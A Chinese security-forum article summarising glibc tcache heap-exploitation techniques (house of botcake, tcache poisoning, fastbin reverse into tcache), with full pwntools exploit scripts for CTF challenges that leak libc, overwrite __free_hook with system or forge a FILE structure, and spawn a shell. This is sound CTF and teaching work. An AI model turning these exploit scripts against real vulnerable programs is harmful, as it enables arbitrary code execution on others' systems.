---
title: 堆攻击tcache常见利用手法总结
url: https://forum.butian.net/share/3921
source: 奇安信攻防社区
date: 2024-12-14
fetch_date: 2025-10-06T19:33:09.100672
---

# 堆攻击tcache常见利用手法总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 堆攻击tcache常见利用手法总结

本篇文章详细记录了笔者对于glibc堆中和有关tcache攻击的理解，同时对常见利用手法进行了分析复现

house of botcake
================
[可以看看这篇文章](https://xz.aliyun.com/t/12653?time\_\_1311=mqmhDvqIxAxfxeqGNDQbYBK3FxhQjwxvxx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1)
\*\*house of botcake一般都会配合tcache poison一起打\*\*
\*\*打tcache poison时如果限制了malloc的chunk的大小,可以多次分割unsorted bin进行覆写\*\*
\*\*一定要有uaf,只要chunklist不被清空就可以，有mark影响不大\*\*
```python
add(14,0x70,'a')
payload=p64(0)+p64(0x91)+p64(\_\_free\_hook)
add(11,0x20,payload)
```
代码
--
```python
for i in range(7):
add(i,0x80,'a')
#主要用7，8进行操作
add(7,0x80,'a')
add(8,0x80,'a')
add(9,0x20,'b')
for i in range(7):
delete(i)
delete(8)
show(8)
libc\_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x1ecbe0
\_\_free\_hook=libc\_base+libc.sym["\_\_free\_hook"]
system\_addr=libc\_base+libc.sym["system"]
leak("libc\_base ",libc\_base)
#此时会进行unlink 8，让7，8一起进入unsorted bin
delete(7)
#给8腾出一个位置，不然会触发double free or corruption (!prev)
add(10,0x80,'a')
#8既在unsorted bin中，又在tcache中
delete(8)
#打tcache poison
payload='a'\*0x80+p64(0)+p64(0x91)+p64(\_\_free\_hook)
add(11,0xa0,payload)
add(12,0x80,'/bin/sh\x00')
add(13,0x80,p64(system\_addr))
delete(12)
```
核心
--
- 构造出一个chunk既在unsorted bin中，又在tcache中的chunk，我们通过unsorted bin修改这个chunk的next值为free\\_hook，在tcache中结构就为:chunk-&gt;free\\_hook再malloc就可以了
- 特点：同一堆块第一次 free 进 unsorted bin 避免了 key 的产生，第二次 free 进入 tcache，让高版本的 tcache double free 再次成为可能
- 利用方法：
1. 通常的利用思路就是，填充完 tcache bin 链表后，然后把一个chunkA free到 unsorted bin 中，然后把这一个chunkA 的prev chunk,chunkB free掉，这样A、B就会合并，unsorted bin中的fd指针就从指向chunk A到指向chunk B
2. 之后我们先申请一个chunk 在tcache bin中给chunk A 留下空间，利用 house of hotcake 的原理再free chunkA, 这时候chunk A 已经double free 了（既在unsorted bin中又在tcache中），然后我们可以在unsoreted bin中申请一个比较大的空间，通过chunkB、chunkA 的相邻来改变chunkA 的fd指针,让其指向free\\_hook
3. 此时tcache结构为:chunk A-&gt;free\\_hook（原本的链断了），申请两次chunk打free\\_hook
例题 libc2.31 beginctf2024 zeheap
-------------------------------
1.注意到题目中delete没有做什么检查，可以uaf让多个指针指向同一个chunk，最后打house of botcake
2.show的时候会检查mark,但是很好绕过，就是让list\[i\]不同的i指向同一个chunk即可
```python
from pwn import \*
from pwnlib.util.packing import p64
from pwnlib.util.packing import u64
context(os='linux', arch='amd64', log\_level='debug')
file = "/home/zp9080/PWN/zeheap"
libc=ELF("/home/zp9080/PWN/libc-2.31.so")
elf=ELF(file)
sh=process(file)
# sh=gdb.debug(file,'b \*$rebase(0x193F )')
def create(idx):
sh.sendlineafter("choose:\n",b'1')
sh.sendlineafter("num:\n",str(idx))
def edit(idx,content):
sh.sendlineafter("choose:\n",b'2')
sh.sendlineafter("num:\n",str(idx))
sh.sendafter("read:\n",content)
def show(idx):
sh.sendlineafter("choose:\n",b'3')
sh.sendlineafter("num:\n",str(idx))
def delete(idx):
sh.sendlineafter("choose:\n",b'4')
sh.sendlineafter("num:\n",str(idx))
#一般都习惯于找一个以后都不用的chunk写入/bin/sh
create(15)
edit(15,b'/bin/sh\x00')
for i in range(7):
create(i)
create(7)
create(8)
#防止与top chunk合并
create(9)
for i in range(7):
delete(i)
#7和8一起在unsorted bin中
delete(7)
delete(8)
#给8腾出一个tcache位置
create(0)
#double free tcache:8-&gt;...
delete(8)
#8和10指向同一个chunk
create(10)
#清空tcache
for i in range(1,7):
create(i)
#清楚到unsorted bin中只剩8，8和10指向同一个chunk
create(11)
show(10)
main\_arena\_offset = libc.sym["\_\_malloc\_hook"] + 0x10
libcbase=u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-main\_arena\_offset-96
\_\_free\_hook=libcbase+libc.sym["\_\_free\_hook"]
system\_addr=libcbase+libc.sym["system"]
print('libcbase:',hex(libcbase))
#8==10==12
create(12)
#tcache 10-&gt;0
delete(0)
delete(10)
#tcache 10-&gt;\_\_free\_hook
edit(12,p64(\_\_free\_hook))
create(13)
create(14)
edit(14,p64(system\_addr))
delete(15)
sh.interactive()
```
例题libc2.35 XYCTF2024 ptmalloc2 it's myheap
------------------------------------------
1.题目上来就给了个libc，但其实不给也能泄露libc
2.发现没有edit，只能在add的时候进行read,而且没有off-by-null，认为只能打tcache不能打largebin了，而且是打house of botcake，因为无法edit tcache\\_key
3.发现有uaf但是有mark这个标记，而且是malloc(0x18)后再malloc(size)
4.mark的存在让double free变得困难，但是要注意mark也是在堆上的，意味着可以再申请回来改写，这样就可以double free
5.更具体遇到的问题见exp
```python
from pwn import \*
from pwnlib.util.packing import u64
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
context(os='linux', arch='amd64', log\_level='debug')
# p=process('/home/zp9080/PWN/pwn')
elf=ELF('/home/zp9080/PWN/pwn')
p=remote('10.128.144.30',51655)
#51655
libc=elf.libc
def dbg():
gdb.attach(p,'b \*0x401773')
pause()
def add(idx,size,content):
p.sendlineafter("&gt;&gt;&gt; ",str(1))
p.sendlineafter("chunk\_idx: ",str(idx))
p.sendlineafter("chunk size: ",str(size))
p.sendafter("chunk data: ",content)
def delete(idx):
p.sendlineafter("&gt;&gt;&gt; ",str(2))
p.sendlineafter("chunk id: ",str(idx))
def show(idx):
p.sendlineafter("&gt;&gt;&gt; ",str(3))
p.sendlineafter("chunk id: ",str(idx))
p.sendlineafter("&gt;&gt;&gt; ",str(114514))
p.recvuntil("this is a gift: ")
libcbase=int(p.recv(14), 16)-libc.sym['puts']
print(hex(libcbase))
#利用largebin泄露heapbase
add(0,0x410,b'a')
add(15,0x20,b'a')
delete(0)
add(1,0x500,b'a')
delete(1)
add(0,0x410,b'a')
show(0)
p.recv(16)
heapbase=u64(p.recv(8)) -0x2b0
print(hex(heapbase))
#-------------------此时bin是空的---------------------
#------------------house of botcake--------------
for i in range(7):
add(i,0x80,'a')
#主要用7，8进行操作
add(7,0x80,'a')
add(8,0x80,'a')
add(9,0x18,'a')
for i in range(7):
delete(i)
delete(8)
#注意此时堆的情况，0x20大小的chunk在tcache和fastbin中都有
#一直因为mark导致不能double free，但是通过以下方式mark可以修改8的mark=1
add(15,0x18,b'a')
add(14,0x18,b'a')
add(13,0x18,b'a')
add(12,0x18,p64(0x80)+p64(1)+p64(heapbase+0xcd0))
delete(15)
delete(14)
delete(13)
delete(12)
#实际操作中发现8的0x20大小的chunk总成为barrier导致无法unlink
#触发malloc consolidate,让8的0x20的chunk合并到smallbin中为了正常触发unlink
add(15,0x500,b'a')
#此时会进行unlink 8，让7，8一起进入unsorted bin
delete(7)
#给8腾出一个位置，不然会触发double free or corruption (!prev)
#----------这个地方卡了好久，如果不留位置，8的chunk大小为0x90，又回到unsorted bin中，会触发上述报错----------------
add(10,0x80,'a')
#注意8的大小为0x20+0x90=0xb0,8既在unsorted bin中，又在tcache中
delete(8)
#打tcache poison,然后打apple2
io\_list\_all=libcbase+libc.sym['\_IO\_list\_all']
payload=b'a'\*0xa0+p64(0)+p64(0x91)+p64(io\_list\_all ^ ((heapbase+0xcc0)&gt;&gt;12) )
add(11,0xc0,payload)
add(0,0x80,b'a')
add(1,0x80,p64(heapbase+0x12b0)) #mem
system\_addr=libcbase+libc.sym['system']
ioaddr=heapbase+0x12b0
payload = b' sh;\x00\x00\x00'+p64(0)+p64(0)\*2 + p64(1) + p64(2) #这样设置同时满足fsop
payload = payload.ljust(0xa0, b'\x00') + p64(ioaddr + 0xe0) #\_wide\_data=fake\_IO\_addr + 0xe0
payload = payload.ljust(0xd8, b'\x00') + p64(libcbase + libc.sym['\_IO\_wfile\_jumps']) #vtable=\_IO\_wfile\_jumps
payload = payload.ljust(0xe0 + 0xe0, b'\x00')+p64(ioaddr+0xe0+0xe8)
payload = payload.ljust(0xe0 + 0xe8 + 0x68, b'\x00') + p64(system\_addr)
add(2,0x410,payload)
p.sendlineafter("&gt;&gt;&gt; ",str(4))
p.interactive()
```
fastbin reverse into tcache
===========================
[参考博客1](https://blog.csdn.net/weixin\_46483787/article/details/122859709)
[参考博客2](https://bbs.kanxue.com/thread-272884.htm)
低版本
---
- 在2.27-2.31版本中，没有对fd指针加密，所以在利用的时候非常简单，只需要将tcache填满，然后放7个chunk进fastbin，并将第一个放进fastbin的chunk的fd改成目标地址，然后清空tcache，申请一个fastbin出来，就可以将target链入tcache并且是在头部，这样即可实现任意地址写一个堆地址的目的，还能将链入tcache的地址申请出来，达到任意地址写任意值。 高版本
---
- 从libc2.32开始，针对tcache和fastbin的fd指针都进行了一个加密，加密过程是用当前chunk的地址&gt;&gt;12去和fd值异或，并将结果作为新的fd值，所以在进行fastbin reverse into tcache的时候，就不能单纯的将fastbin的fd该成目标地址了，需要先和其地址&gt;&gt;12去异或
例题 TinyNote
-----------
- 这个题最多申请3个chunk，有uaf...